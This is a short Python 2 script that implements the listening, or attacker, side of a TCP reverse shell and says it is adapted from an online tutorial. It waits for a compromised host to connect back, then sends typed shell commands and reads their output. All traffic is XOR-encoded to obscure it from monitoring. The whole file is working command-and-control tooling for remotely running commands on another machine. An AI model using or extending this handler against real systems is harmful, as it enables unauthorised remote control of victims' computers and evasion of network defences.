#!/usr/bin/python

import socket

# TCP Reverse Shell using Python
# Adapted from http://www.primalsecurity.net/0x2-python-tutorial-reverse-shell/

# Gather IP Address to Bind to
ipAddr = raw_input('Input Listening IP Address: ')
portNum = raw_input('Input Listening Port: ')
xorkey = raw_input('XOR Key (0-256): ')
xorkey = int(xorkey)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ipAddr, int(portNum)))
s.listen(2)
print "Listening on port " + portNum + "..."
(client, (ip, port)) = s.accept()
print "Received connection from: " + ip

while True:
 command = raw_input('~$ ')
 encode = bytearray(command)
 encode = bytearray(x ^ xorkey for x in encode)
 client.send(encode)
 en_data=client.recv(2048)
 decode = bytearray(en_data)
 decode = bytearray(x ^ xorkey for x in decode)
 print decode

client.close()
s.close()
